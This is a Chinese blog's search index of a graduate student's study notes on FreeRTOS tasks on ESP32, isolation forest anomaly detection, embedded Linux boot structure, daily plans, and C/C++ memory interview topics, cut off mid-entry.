<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>简历梳理</title>
      <link href="/2022/12/11/%E7%AE%80%E5%8E%86%E6%A2%B3%E7%90%86/"/>
      <url>/2022/12/11/%E7%AE%80%E5%8E%86%E6%A2%B3%E7%90%86/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> work,graduate student </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>周报</title>
      <link href="/2022/11/28/%E5%91%A8%E6%8A%A5/"/>
      <url>/2022/11/28/%E5%91%A8%E6%8A%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ol><li>freeRTOS系统学习<br><a href="https://freertos.org/RTOS-task-states.html">参考官方文档</a><br><a href="https://www.bilibili.com/video/BV1Nb4y1q7xz/?spm_id_from=333.788&vd_source=6dbca05574a96cc5925db86217ad31cc">参考Michael_ee老师教学</a>  </li></ol><ul><li><input checked="" disabled="" type="checkbox"> 了解Free RTOS的启动机制</li><li><input disabled="" type="checkbox"> 掌握task</li><li><input disabled="" type="checkbox"> 掌握list </li><li><input disabled="" type="checkbox"> 掌握queue</li></ul><ol start="2"><li>论文阅读<h1 id="DONE"><a href="#DONE" class="headerlink" title="DONE"></a>DONE</h1><h2 id="基本应用程序启动流程"><a href="#基本应用程序启动流程" class="headerlink" title="基本应用程序启动流程"></a>基本应用程序启动流程</h2><h3 id="框架结构"><a href="#框架结构" class="headerlink" title="框架结构"></a>框架结构</h3></li><li>First stage bootloader</li></ol><blockquote><p>位于只读的ROM，主动在flash的0x1000偏移地址处加载second stage bootloader 到RAM（IRAM &amp; DRAM）中。</p></blockquote><p>位于components的bootloader文件夹中，都为build文件。</p><ol start="2"><li>Second stage bootloader</li></ol><blockquote><p>从flash中加载分区表和主程序镜像。主程序中包含RAM段和通过flash高速缓存映射的只读段。</p></blockquote><p>位于components/bootloader_support文件夹中，包含了各种芯片的初始化启动代码。</p><ol start="3"><li>Application startup（应用程序入口）</li></ol><blockquote><p>第二个CPU和RTOS的调度器启动。</p></blockquote><p>位于components/freertos文件夹中，核心文件为==list.c #F44336==、==queue.c #FF5722==、==task.c #FF9800==。其中port文件夹中针对不同系统的移植代码。</p><p><img src="https://files.shanqianche.cn/202211/1667286874288.png" alt="针对不同内核的移植代码"></p><h3 id="应用程序的调用顺序"><a href="#应用程序的调用顺序" class="headerlink" title="应用程序的调用顺序"></a>应用程序的调用顺序</h3><blockquote><p>位于 ==freeRTOS #00BCD4==<br>-&gt; app_main()<br>-&gt; 【port_common.c】main_task()<br>-&gt;【port_common.c】xTaskCreatePinnedToCord() 创建了一个main_task<br>-&gt; 在esp_startup_start_app_common()中利用xTaskCreatePinnedToCord创建main_task()<br>-&gt; 【port.c】esp_startup_start_app_common() 此函数主要用于创建对所有task的调度操作，涉及到优先级<br>位于==esp-system #00BCD4==<br>-&gt; 【startup.c】start_cpu0_default() 该函数主要初始化核心组件及服务。<br>-&gt; 【startup.c】弱连接到start_cpu0(), 该函数中涉及到硬件初始化<br>-&gt; 【startup_internal.h】g_startup_fn[] 数组可以调用不同的cpu初始化<br>-&gt; 【stratup_internal.h】#define SYS_STARTUP_FN() 宏定义<br>-&gt; 【cpu_start.c】call_start_cpu0()，由于esp32只有一个内核，所以只会被cpu0调用，这个函数同时调用了esp_mspi_pin_init用于初始化esp，，以及调用了bootloader<br>-&gt; 【sections.id.in链接文件】ENTRY(call_start_cpu0) ; 应用程序入口</p></blockquote><p><img src="https://files.shanqianche.cn/202211/1667287763318.png" alt="task创建了一个main_task"></p><p><img src="https://files.shanqianche.cn/202211/1667288388845.png" alt="start_cpu0()弱连接"></p><h2 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h2><h3 id="Task-基本设置"><a href="#Task-基本设置" class="headerlink" title="Task 基本设置"></a>Task 基本设置</h3><h4 id="xTaskCrate"><a href="#xTaskCrate" class="headerlink" title="xTaskCrate()"></a>xTaskCrate()</h4><p><img src="https://files.shanqianche.cn/202211/1667291790344.png" alt="xTaskCreate"><br>pvTaskCode: task函数。<br>pcName: task name。<br>usstackDepth: 表示分配的内存。<br>*pvParmeters: 为task函数的参数指针 ==(void *) #FF9800== ，可以由xTaskCreate函数传递到pvTaskCode。<br>uxPriority: task执行优先级，空闲状态为0，所以一般设置值大于0。<br>*pxCreatedTask: task的handle，可以获得task很多信息，类似与于进程的ID。</p><h5 id="TASK四种类型"><a href="#TASK四种类型" class="headerlink" title="TASK四种类型"></a>TASK四种类型</h5><ol><li>参数为整数</li></ol><p><img src="https://files.shanqianche.cn/202211/1667293389173.png" alt="参数为整数"></p><h5 id="参数为数组"><a href="#参数为数组" class="headerlink" title="参数为数组"></a>参数为数组</h5><blockquote><p>数组名为地址，所以不需要取址</p></blockquote><p><img src="https://files.shanqianche.cn/202211/1667293510828.png" alt="参数为数组"></p><h5 id="参数为结构体"><a href="#参数为结构体" class="headerlink" title="参数为结构体"></a>参数为结构体</h5><p><img src="https://files.shanqianche.cn/202211/1667293604613.png" alt="结构体"></p><h5 id="参数为字符串常量"><a href="#参数为字符串常量" class="headerlink" title="参数为字符串常量"></a>参数为字符串常量</h5><p><img src="https://files.shanqianche.cn/202211/1667293674918.png" alt="字符串常量"></p><h4 id="vTaskDelete-xHandle"><a href="#vTaskDelete-xHandle" class="headerlink" title="vTaskDelete(xHandle)"></a>vTaskDelete(xHandle)</h4><p>删除Task</p><h4 id="vTaskDelay"><a href="#vTaskDelay" class="headerlink" title="vTaskDelay()"></a>vTaskDelay()</h4><p>时延</p><h3 id="Task-Priorities"><a href="#Task-Priorities" class="headerlink" title="Task Priorities"></a>Task Priorities</h3><blockquote><p>系统优先级的范围为[0, max-1]，当task设置的优先级超过最大值时会默认为最大值。<br>==尽量不要修改配置中的优先级最大值，会占用很大内存 #FF572</p></blockquote><p><img src="https://files.shanqianche.cn/202211/1667297323036.png" alt="该宏被设置为1时，优先级不能超过32"></p><h4 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h4><p><img src="https://files.shanqianche.cn/202211/1667296693484.png" alt="优先级的定义"></p><p><img src="https://files.shanqianche.cn/202211/1667296735778.png" alt="配置文件路径"></p><p><img src="https://files.shanqianche.cn/202211/1667296782216.png" alt="优先级的定义"></p><h4 id="uxTaskPriorityGet"><a href="#uxTaskPriorityGet" class="headerlink" title="uxTaskPriorityGet()"></a>uxTaskPriorityGet()</h4><p><img src="https://files.shanqianche.cn/202211/1667296913491.png" alt="获取任务优先级"></p><p><img src="https://files.shanqianche.cn/202211/1667297027490.png" alt="get task priority"></p><h4 id="Same-Priority"><a href="#Same-Priority" class="headerlink" title="Same Priority"></a>Same Priority</h4><pre><code>相同优先级的task，则顺序运行，基于robin调度机制使用时间片共享一个进程时间段。</code></pre><p><img src="https://files.shanqianche.cn/202211/1667297529065.png" alt="Same Priority"></p><h4 id="different-Priority"><a href="#different-Priority" class="headerlink" title="different Priority"></a>different Priority</h4><p>优先级高的先执行，与顺序无关。</p><h4 id="Modify-Priority"><a href="#Modify-Priority" class="headerlink" title="Modify Priority"></a>Modify Priority</h4><blockquote><p>修改优先级 vTaskPrioritySet(TaskHandle_t px, priority);</p></blockquote><p><img src="https://files.shanqianche.cn/202211/1667298265387.png" alt="修改优先级"><br>修改，马上根据新的优先级执行。</p><h3 id="Task-States"><a href="#Task-States" class="headerlink" title="Task States"></a>Task States</h3><blockquote><p>运行状态、准备状态、阻塞状态、挂起状态</p></blockquote><p><img src="https://files.shanqianche.cn/202211/1667298712509.png" alt="task state"></p><p><strong>注意：</strong><br>对于阻塞状态有超时的概念，对于挂起状态则没有这种概念。</p><h2 id="论文知识点理解"><a href="#论文知识点理解" class="headerlink" title="论文知识点理解"></a>论文知识点理解</h2><p><img src="http://files.shanqianche.cn/2021531/1622426214147.png" alt="数据蛋糕"></p><p>假设我们用一个随机超平面来切割（split）数据空间（data space）, 切一次可以生成两个子空间（想象拿刀切蛋糕一分为二）。</p><p>之后我们再继续用一个随机超平面来切割每个子空间，循环下去，直到每子空间里面只有一个数据点为止。</p><blockquote><p><font color="#8B008B">满足的条件</font></p><ul><li>数据本身不可再分割</li><li>二叉树达到限定的最大深度</li></ul></blockquote><p>直观上来讲，我们可以发现那些密度很高的簇是可以被切很多次才会停止切割，但是那些密度很低的点很容易很早的就停到一个子空间里了。</p><p><font color="#6495ED">异常检测原理的理解：</font>由于异常值的数量较少且与大部分样本的疏离性，因此，异常值会被更早的孤立出来，也即异常值会距离iTree的根节点更近，而正常值则会距离根节点有更远的距离。</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>孤立森林算法主要针对的是<strong>连续型结构化</strong>数据中的异常点。</p><p><font color="#FF1493">理论前提</font></p><ul><li>异常数据占总样本量的比例很小</li><li>异常点的特征值与正常点的差异很大</li></ul><p><img src="http://files.shanqianche.cn/2021531/1622426925434.png" alt="数据"></p><p>上图中，中心的白色空心点为正常点，即处于高密度群体中。四周的黑色实心点为异常点，散落在高密度区域以外的空间。</p><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>孤立森林算法是基于 <strong>Ensemble</strong> 的异常检测方法，因此具有<font color="#7FFF00">线性的时间复杂度</font>。且精准度较高，在处理大数据时速度快，所以目前在工业界的应用范围比较广。常见的场景包括：网络安全中的攻击检测、金融交易欺诈检测、疾病侦测、噪声数据过滤（数据清洗）等。</p><blockquote><p><font color="#006400">知识补充</font>集成学习算法 (Ensemble Learning)<br>统机器学习算法 (例如：决策树，人工神经网络，支持向量机，朴素贝叶斯等) 的目标都是寻找一个最优分类器尽可能的将训练数据分开。集成学习 (Ensemble Learning) 算法的基本思想就是将多个分类器<font color="#8FBC8F">组合</font>，从而实现一个预测效果更好的<font color="#8A2BE2">集成分类器</font>。</p></blockquote><blockquote><p><font color="#FF00FF">知识补充：</font><br><a href="https://blog.zuishuailcq.xyz/2021/05/31/%E7%AE%97%E6%B3%95%E7%9A%84%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/">算法的性能指标 | 吾辈之人，自当自强不息！</a></p></blockquote><h2 id="孤立森林的创新点"><a href="#孤立森林的创新点" class="headerlink" title="孤立森林的创新点"></a>孤立森林的创新点</h2><ol><li><font color="#D2691E">Partial models</font>：在训练过程中，每棵孤立树都是随机选取部分样本</li><li><font color="#D2691E">No distance or density measures</font>：不同于 KMeans、DBSCAN 等算法，孤立森林不需要计算有关距离、密度的指标，可大幅度提升速度，减小系统开销</li><li><font color="#D2691E"> Linear time complexity</font>：因为基于 ensemble，所以有线性时间复杂度。通常树的数量越多，算法越稳定</li><li><font color="#D2691E">Handle extremely large data size</font>：由于每棵树都是独立生成的，因此可部署在大规模分布式系统上来加速运算</li></ol>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study, graduate student </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux移植入门</title>
      <link href="/2022/11/17/Linux%E7%A7%BB%E6%A4%8D%E5%85%A5%E9%97%A8/"/>
      <url>/2022/11/17/Linux%E7%A7%BB%E6%A4%8D%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="典型分区结构"><a href="#典型分区结构" class="headerlink" title="典型分区结构"></a>典型分区结构</h1><blockquote><p>bootloader、kernel、rootfs、data fs</p></blockquote><p><img src="https://files.shanqianche.cn/202211/1668690135821.png" alt="典型分区结构"></p><h1 id="Bootloader"><a href="#Bootloader" class="headerlink" title="Bootloader"></a>Bootloader</h1><h2 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h2><ul><li>初始化硬件：</li><li>将操作系统内核从Flash:拷贝到SDRAM中；</li><li>改写系统的内存映射，原先Flash起始地址映射为O地址，这时需要将RAM的起始地址映射为0;</li><li>设置堆栈指针并将bss段清零，执行C语言程序和调用子函数时要用到：</li><li>提供Linux内核的启动参数；</li><li>启动Linux内核；</li><li>改变pc值，使得CPU开始执行真正的操作系统内核。</li></ul><h1 id="Linux-kernel"><a href="#Linux-kernel" class="headerlink" title="Linux kernel"></a>Linux kernel</h1><h2 id="功能及本质"><a href="#功能及本质" class="headerlink" title="功能及本质"></a>功能及本质</h2><blockquote><p>功能：进程管理、文件系统、内存管理、设备管理、网络协议</p></blockquote><p><img src="https://files.shanqianche.cn/202211/1668690644352.png" alt="功能"><br>内存管理：裸板上是物理地址，基于Linux系统则是虚拟地址<br>进程管理：宏观并行、微观串行<br>文件系统：虚拟文件系统。emc</p><p><strong>内核本质：</strong><br>从C语言角度来看内核，C语言函数集合；<br>从硬件角度来看内核，管理者和维护者；<br>从应用程序的角度来看内核，服务提供者；</p><h1 id="data-fs-嵌入式文件系统"><a href="#data-fs-嵌入式文件系统" class="headerlink" title="data fs 嵌入式文件系统"></a>data fs 嵌入式文件系统</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ol><li>是一种对存储设备上的数据进行<font color="#FF8C00">组织和控制</font>的机制。</li><li>是操作系统的一部分，负责管理和存储文件信息。</li></ol><p><img src="https://files.shanqianche.cn/202211/1668691081644.png" alt="data fs"></p><h1 id="三者之间关系"><a href="#三者之间关系" class="headerlink" title="三者之间关系"></a>三者之间关系</h1><p><strong>Bootloader</strong></p><ul><li>硬件上电后跳到一个固定位置执行相应的代码</li><li>初始化相应的硬件设备</li><li>加载操作系统内核代码到内存</li><li>跳到内核代码起始位置执行</li></ul><p><strong>Kernel</strong></p><ul><li>内核自解压(ulmage)</li><li>初始化相应的硬件设备</li><li>初始化静态编译进内核的驱动模块I</li><li>挂载根文件系统</li><li>直接执行第一个用户空间程序</li></ul><p><strong>第一个用户空间程序</strong></p><ul><li>配置用户环境和执行服务进程</li></ul>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study, graduate student,linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天天PLAN</title>
      <link href="/2022/11/14/%E5%A4%A9%E5%A4%A9PLAN/"/>
      <url>/2022/11/14/%E5%A4%A9%E5%A4%A9PLAN/</url>
      
        <content type="html"><![CDATA[<h1 id="1114"><a href="#1114" class="headerlink" title="1114"></a>1114</h1><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li><input checked="" disabled="" type="checkbox"> 08:50~09:40 上午任务一 <strong><font color="#e680ff">STM32第十五节</font></strong></li><li><input checked="" disabled="" type="checkbox"> 09:45~10:10 上午任务二 <strong><font color="#6fd9ea">STM32第十五节done</font></strong></li><li><input checked="" disabled="" type="checkbox"> 10:20~10:50 上午任务三 <strong><font color="#ff7500">STM32第十六节done</font></strong></li><li><input checked="" disabled="" type="checkbox"> 10:50~11:20 总结与反思</li></ul><hr><ul><li><input checked="" disabled="" type="checkbox"> 14:00~15:00 下午任务一   <a href="6f4a99ac-581a-4c80-96db-8359b9ecdcfe">C和C++的基础</a></li><li><input checked="" disabled="" type="checkbox"> 15:00~16:00 下午任务二 <strong><font color="#01274F"><a href="6f4a99ac-581a-4c80-96db-8359b9ecdcfe">C和C++的基础</a></font></strong></li><li><input checked="" disabled="" type="checkbox"> 16:00~16:40 下午任务三 <strong><font color="#2e4e7e"><a href="6f4a99ac-581a-4c80-96db-8359b9ecdcfe">C和C++的基础</a></font></strong></li><li><input disabled="" type="checkbox"> 16:40~17:10 下午学习总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 18:30~20:00 晚上任务一 <strong><font color="#8B008B">任务</font></strong></li><li><input disabled="" type="checkbox"> 20:00~21:30 晚上任务二 <strong><font color="#2c201f">任务</font></strong></li><li><input checked="" disabled="" type="checkbox"> 21:30~22:10 晚上任务三 <strong><font color="#7FFF00">任务</font></strong></li><li><input checked="" disabled="" type="checkbox"> 22:10~22:30 晚上学习总结与查漏补缺</li></ul><h1 id="1115"><a href="#1115" class="headerlink" title="1115"></a>1115</h1><h1 id="TODO-1"><a href="#TODO-1" class="headerlink" title="TODO"></a>TODO</h1><ul><li><input disabled="" type="checkbox"> 14:00~15:00 下午任务一 <strong><font color="#49e979">STM32</font></strong></li><li><input disabled="" type="checkbox"> 15:00~16:00 下午任务二 <strong><font color="#01274F">任务</font></strong></li><li><input disabled="" type="checkbox"> 16:00~16:40 下午任务三 <strong><font color="#2e4e7e">任务</font></strong></li><li><input disabled="" type="checkbox"> 16:40~17:10 下午学习总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 18:30~20:00 晚上任务一 <strong><font color="#8B008B">任务</font></strong></li><li><input disabled="" type="checkbox"> 20:00~21:30 晚上任务二 <strong><font color="#2c201f">任务</font></strong></li><li><input disabled="" type="checkbox"> 21:30~22:10 晚上任务三 <strong><font color="#7FFF00">任务</font></strong></li><li><input disabled="" type="checkbox"> 22:10~22:30 晚上学习总结与查漏补缺</li></ul>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study, graduate student </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++基础（二）</title>
      <link href="/2022/11/14/C/C++%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2022/11/14/C/C++%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="C-内存"><a href="#C-内存" class="headerlink" title="C++内存"></a>C++内存</h1><h2 id="简述一下堆和栈的区别"><a href="#简述一下堆和栈的区别" class="headerlink" title="简述一下堆和栈的区别"></a>简述一下堆和栈的区别</h2><h3 id="堆栈空间分配不同"><a href="#堆栈空间分配不同" class="headerlink" title="堆栈空间分配不同"></a>堆栈空间分配不同</h3><p>栈由操作系统自动分配释放 ，存放函数的参数值，局部变量的值等；堆一般由程序员分配释放。</p><h3 id="堆栈缓存方式不同"><a href="#堆栈缓存方式不同" class="headerlink" title="堆栈缓存方式不同"></a>堆栈缓存方式不同</h3><p>栈使用的是一级缓存， 它们通常都是被调用时处于存储空间中，调用完毕立即释放；堆则是存放在二级缓存中，速度要慢些。</p><h3 id="堆栈数据结构不同"><a href="#堆栈数据结构不同" class="headerlink" title="堆栈数据结构不同"></a>堆栈数据结构不同</h3><p><font color="#FF00FF">堆类似数组结构</font>；栈类似栈结构，先进后出。</p><h2 id="简述C-的内存管理"><a href="#简述C-的内存管理" class="headerlink" title="简述C++的内存管理"></a>简述C++的内存管理</h2><h3 id="内存分配方式"><a href="#内存分配方式" class="headerlink" title="内存分配方式"></a>内存分配方式</h3><blockquote><p>在C++中，内存分成5个区，他们分别是<font color="#FF00FF">堆、栈、自由存储区、全局/静态存储区和常量存储区</font>。</p></blockquote><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。</p><h4 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h4><p>就是那些由new分配的内存块，一般一个new就要对应一个delete</p><h4 id="自由存储区"><a href="#自由存储区" class="headerlink" title="自由存储区"></a>自由存储区</h4><p><font color="#FF8C00">就是那些由malloc等分配的内存块，和堆是十分相似的，不过是用free来结束自己的生命</font>。</p><h4 id="全局-静态存储区"><a href="#全局-静态存储区" class="headerlink" title="全局/静态存储区"></a>全局/静态存储区</h4><p>全局变量和静态变量被分配到同一块内存中</p><h4 id="常量存储区"><a href="#常量存储区" class="headerlink" title="常量存储区"></a>常量存储区</h4><p>这是一块比较特殊的存储区，里面存放的是常量，不允许修改。</p><h3 id="常见的内存错误及其对策"><a href="#常见的内存错误及其对策" class="headerlink" title="常见的内存错误及其对策"></a>常见的内存错误及其对策</h3><h4 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h4><p>（1）内存<font color="#FF8C00">分配未成功</font>，却使用了它。<br>（2）内存分配虽然成功，但是尚<font color="#FF8C00">未初始化</font>就引用它。<br>（3）内存分配成功并且已经初始化，但操作<font color="#FF8C00">越过了内存的边界</font>。<br>（4）忘记了释放内存，造成<font color="#FF8C00">内存泄露</font>。<br>（5）<font color="#FF8C00">释放了内存却继续使用它</font>。</p><h4 id="对策"><a href="#对策" class="headerlink" title="对策"></a>对策</h4><p>（1）定义指针时，先初始化为NULL。<br>（2）用malloc或new申请内存之后，应该<strong>立即检查</strong>指针值是否为NULL。防止使用指针值为NULL的内存。<br>（3）不要忘记为数组和动态内存<strong>赋初值</strong>。防止将未被初始化的内存作为右值使用。<br>（4）避免数字或指针的下标<strong>越界</strong>，特别要当心发生“多1”或者“少1”操作<br>（5）动态内存的申请与释放必须配对，防止<strong>内存泄漏</strong><br>（6）用free或delete释放了内存之后，立即将指针<strong>设置为NULL</strong>，防止“野指针”<br>（7）使用智能指针。</p><h2 id="内存泄露及解决办法"><a href="#内存泄露及解决办法" class="headerlink" title="内存泄露及解决办法"></a>内存泄露及解决办法</h2><h3 id="什么是内存泄露？"><a href="#什么是内存泄露？" class="headerlink" title="什么是内存泄露？"></a>什么是内存泄露？</h3><p>简单地说就是申请了一块内存空间，使用完毕后没有释放掉。（1）new和malloc申请资源使用后，没有用delete和free释放；<font color="#FF8C00">（2）子类继承父类时，父类析构函数不是虚函数。（3）Windows句柄资源使用后没有释放。</font></p><h3 id="怎么检测？"><a href="#怎么检测？" class="headerlink" title="怎么检测？"></a>怎么检测？</h3><p>第一：良好的编码习惯，使用了内存分配的函数，一旦使用完毕,要记得使用其相应的函数释放掉。<br>第二：<font color="#FF8C00">将分配的内存的指针以链表的形式自行管理</font>，使用完毕之后从链表中删除，程序结束时可检查改链表。<br>第三：使用智能指针。<br>第四：一些常见的工具插件，如ccmalloc、Dmalloc、Leaky、Valgrind等等。</p><h2 id="malloc和局部变量分配在堆还是栈"><a href="#malloc和局部变量分配在堆还是栈" class="headerlink" title="malloc和局部变量分配在堆还是栈"></a>malloc和局部变量分配在堆还是栈</h2><p><font color="#FF8C00">malloc是在堆上分配内存，需要程序员自己回收内存</font>；<font color="#DEB887">局部变量是在栈中分配内存，超过作用域就自动回收</font>。</p><h2 id="程序有哪些section，分别的作用？程序启动的过程？怎么判断数据分配在栈上还是堆上？"><a href="#程序有哪些section，分别的作用？程序启动的过程？怎么判断数据分配在栈上还是堆上？" class="headerlink" title="程序有哪些section，分别的作用？程序启动的过程？怎么判断数据分配在栈上还是堆上？"></a>程序有哪些section，分别的作用？程序启动的过程？怎么判断数据分配在栈上还是堆上？</h2><p><img src="https://files.shanqianche.cn/202211/1668432991745.png" alt="程序结构图"><br><strong>一个程序有哪些section：</strong></p><blockquote><p>从低地址到高地址，一个程序由代码段、数据段、BSS段、堆、共享区、栈等组成。</p></blockquote><ol><li><strong>数据段：</strong> 存放程序中已初始化的全局变量和静态变量的一块内存区域。</li><li><strong>代码段</strong>：存放程序执行代码的一块内存区域。只读，代码段的头部还会包含一些只读的常数变量</li><li><strong>BSS</strong>：存放程序中未初始化的全局变量和静态变量的一块内存区域。</li><li>可执行程序在运行时又会多出两个区域：<strong>堆区和栈区。</strong><ul><li>堆区：动态申请内存用。堆从低地址向高地址增长。</li><li>栈区：存储局部变量、函数参数值。栈从高地址向低地址增长。是一块连续的空间。</li></ul></li><li>最后还有一个共享区，位于堆和栈之间。</li></ol><p><strong><font color="#FF00FF">程序启动的过程</font>：</strong></p><ol><li>操作系统首先创建相应的进程并分配私有的进程空间，然后操作系统的加载器负责把可执行文件的数据段和代码段映射到进程的虚拟内存空间中。</li><li>加载器读入可执行程序的导入符号表，根据这些符号表可以查找出该可执行程序的所有依赖的动态链接库。</li><li>加载器针对该程序的每一个动态链接库调用LoadLibrary （1）查找对应的动态库文件，加载器为该动态链接库确定一个合适的基地址。 （2）加载器读取该动态链接库的导入符号表和导出符号表，比较应用程序要求的导入符号是否匹配该库的导出符号。 （3）针对该库的导入符号表，查找对应的依赖的动态链接库，如有跳转，则跳到3 （4）调用该动态链接库的初始化函数</li><li>初始化应用程序的全局变量，对于全局对象自动调用构造函数。</li><li>进入应用程序入口点函数开始执行。</li></ol><p><strong>怎么判断数据分配在栈上还是堆上</strong>：首先局部变量分配在栈上；而通过malloc和new申请的空间是在堆上</p><h2 id="初始化为0的全局变量在bss还是data"><a href="#初始化为0的全局变量在bss还是data" class="headerlink" title="初始化为0的全局变量在bss还是data"></a>初始化为0的全局变量在bss还是data</h2><p>BSS段通常是指用来<font color="#FF8C00">存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域</font>。特点是可读写的，在程序执行之前BSS段会自动清0。</p><h2 id="什么是内存泄露，内存泄露怎么检测？"><a href="#什么是内存泄露，内存泄露怎么检测？" class="headerlink" title="什么是内存泄露，内存泄露怎么检测？"></a>什么是内存泄露，内存泄露怎么检测？</h2><blockquote><p>简单地说就是申请了一块内存空间，使用完毕后没有释放掉。（1）new和malloc申请资源使用后，没有用delete和free释放；（2）子类继承父类时，父类析构函数不是虚函数。（3）Windows句柄资源使用后没有释放。</p></blockquote><h2 id="请简述一下atomoic内存顺序"><a href="#请简述一下atomoic内存顺序" class="headerlink" title="请简述一下atomoic内存顺序"></a>请简述一下atomoic内存顺序</h2><p><strong>有六个内存顺序选项可应用于对原子类型的操作：</strong></p><ol><li>memory_order_relaxed：在原子类型上的操作以自由序列执行，没有任何同步关系，仅对此操作要求原子性。</li><li>memory_order_consume：memory_order_consume只会对其标识的对象保证该对象存储先行于那些需要加载该对象的操作。</li><li>memory_order_acquire：使用memory_order_acquire的原子操作，当前线程的读写操作都不能重排到此操作之前。</li><li>memory_order_release：使用memory_order_release的原子操作，当前线程的读写操作都不能重排到此操作之后。</li><li>memory_order_acq_rel：memory_order_acq_rel在此内存顺序的读-改-写操作既是获得加载又是释放操作。没有操作能够从此操作之后被重排到此操作之前，也没有操作能够从此操作之前被重排到此操作之后。</li><li>memory_order_seq_cst：memory_order_seq_cst比std::memory_order_acq_rel更为严格。memory_order_seq_cst不仅是一个”获取释放”内存顺序，它还会对所有拥有此标签的内存操作建立一个单独全序。</li></ol><p><strong>除非你为特定的操作指定一个顺序选项，否则内存顺序选项对于所有原子类型默认都是memory_order_seq_cst。</strong></p><h2 id="简述C-中内存对齐的使用场景"><a href="#简述C-中内存对齐的使用场景" class="headerlink" title="简述C++中内存对齐的使用场景"></a>简述C++中内存对齐的使用场景</h2><blockquote><p><font color="#FF8C00">内存对齐</font>应用于三种数据类型中：struct/class/union</p></blockquote><p><strong>struct/class/union内存对齐原则有四个：</strong></p><ol><li>数据成员对齐规则：结构(struct)或联合(union)的数据成员，第一个数据成员放在offset为0的地方，以后每个数据成员存储的起始位置要从该成员大小或者成员的子成员大小的整数倍开始。</li><li>结构体作为成员:如果一个结构里有某些结构体成员,则结构体成员要从其内部”最宽基本类型成员”的整数倍地址开始存储。(struct a里存有struct b,b里有char,int ,double等元素,那b应该从8的整数倍开始存储)。</li><li>收尾工作:结构体的总大小，也就是sizeof的结果，必须是其内部最大成员的”最宽基本类型成员”的整数倍。不足的要补齐。(基本类型不包括struct/class/uinon)。</li><li>sizeof(union)，以结构里面size最大元素为union的size，因为在某一时刻，union只有一个成员真正存储于该地址。</li></ol><h3 id="什么是内存对齐？"><a href="#什么是内存对齐？" class="headerlink" title="什么是内存对齐？"></a>什么是内存对齐？</h3><p>在C语言中，结构体是一种复合数据类型，其构成元素既可以是基本数据类型（如int、long、float等）的变量，也可以是一些复合数据类型（如数组、结构体、联合体等）的数据单元。在结构体中，**<font color="#FF8C00">编译器为结构体的每个成员按其自然边界（alignment）分配空间</font>**。各个成员按照它们被声明的顺序在内存中顺序存储，第一个成员的地址和整个结构体的地址相同。</p><p>为了使CPU能够对变量进行快速的访问，变量的起始地址应该具有某些特性，即所谓的“对齐”，比如4字节的int型，其起始地址应该位于4字节的边界上，即起始地址能够被4整除，也即“对齐”跟数据在内存中的位置有关。<font color="#FF8C00">如果一个变量的内存地址正好位于它长度的整数倍，他就被称做自然对齐</font>。</p><p>比如在32位cpu下，假设一个整型变量的地址为0x00000004(为4的倍数)，那它就是自然对齐的，而如果其地址为0x00000002（非4的倍数）则是非对齐的。现代计算机中内存空间都是按照byte划分的，从理论上讲似乎对任何类型的变量的访问可以从任何地址开始，但实际情况是在访问特定类型变量的时候经常在特定的内存地址访问，这就需要各种类型数据按照一定的规则在空间上排列，而不是顺序的一个接一个的排放，这就是对齐。</p><h3 id="为什么要字节对齐？"><a href="#为什么要字节对齐？" class="headerlink" title="为什么要字节对齐？"></a>为什么要字节对齐？</h3><p>需要字节对齐的根本原因在于CPU访问数据的效率问题。假设上面整型变量的地址不是自然对齐，比如为0x00000002，则CPU如果取它的值的话需要访问两次内存，第一次取从0x00000002-0x00000003的一个short，第二次取从0x00000004-0x00000005的一个short然后组合得到所要的数据，如果变量在0x00000003地址上的话则要访问三次内存，第一次为char，第二次为short，第三次为char，然后组合得到整型数据。</p><p>而如果变量在自然对齐位置上，则只要一次就可以取出数据。一些系统对对齐要求非常严格，比如sparc系统，如果取未对齐的数据会发生错误，而在x86上就不会出现错误，只是效率下降。</p><p>各个硬件平台对存储空间的处理上有很大的不同。一些平台对某些特定类型的数据只能从某些特定地址开始存取。比如有些平台每次读都是从偶地址开始，如果一个int型（假设为32位系统）如果存放在偶地址开始的地方，那么一个读周期就可以读出这32bit，而如果存放在奇地址开始的地方，就需要2个读周期，并对两次读出的结果的高低字节进行拼凑才能得到该32bit数据。显然在读取效率上下降很多。</p><h3 id="字节对齐实例"><a href="#字节对齐实例" class="headerlink" title="字节对齐实例"></a>字节对齐实例</h3><figure 